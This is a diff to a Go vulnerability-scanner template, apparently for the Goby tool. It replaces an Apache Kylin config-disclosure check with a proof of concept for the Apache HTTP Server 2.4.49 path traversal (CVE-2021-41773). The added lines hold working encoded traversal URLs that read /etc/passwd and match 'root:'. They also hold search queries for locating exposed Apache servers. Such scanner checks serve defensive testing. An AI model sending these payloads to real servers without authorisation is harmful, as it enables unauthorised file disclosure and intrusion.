@@ -6,15 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "Apache Kylin config 未授权配置泄露 CVE-2020-13937",
+  "Name": "Apache HTTP Server 2.4.49 路径穿越漏洞 CVE-2021-41773",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "app=\"APACHE-kylin\" || product=\"APACHE-kylin\" || title=\"kylin\"",
-  "GobyQuery": "app=\"APACHE-kylin\" || product=\"APACHE-kylin\" || title=\"kylin\"",
-  "Level": "2",
+  "FofaQuery": "server=\"Apache\" || \"apache http server\"",
+  "GobyQuery": "server=\"Apache\" || \"apache http server\"",
+  "Level": "3",
   "Impact": "",
   "Recommendation": "",
   "References": [],
@@ -26,12 +26,12 @@ func init() {
     "Content": ""
   },
   "ScanSteps": [
-    "AND",
+    "OR",
     {
       "Request": {
         "method": "GET",
-        "uri": "/kylin/api/admin/config",
-        "follow_redirect": true,
+        "uri": "/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
+        "follow_redirect": false,
         "header": {},
         "data_type": "text",
         "data": ""
@@ -51,7 +51,38 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "kylin.metadata.",
+            "value": "root:",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+        "follow_redirect": false,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "root:",
             "bz": ""
           }
         ]
@@ -107,7 +138,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "Apache Kylin config 未授权配置泄露 CVE-2020-13937",
+      "Name": "Apache HTTP Server 2.4.49 路径穿越漏洞 CVE-2021-41773",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +147,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "Apache Kylin config Unauthorized Configuration Disclosure CVE-2020-13937",
+      "Name": " Apache HTTP Server 2.4.49 Path Traverse CVE-2021-41773",
       "Product": "",
       "Description": "",
       "Recommendation": "",
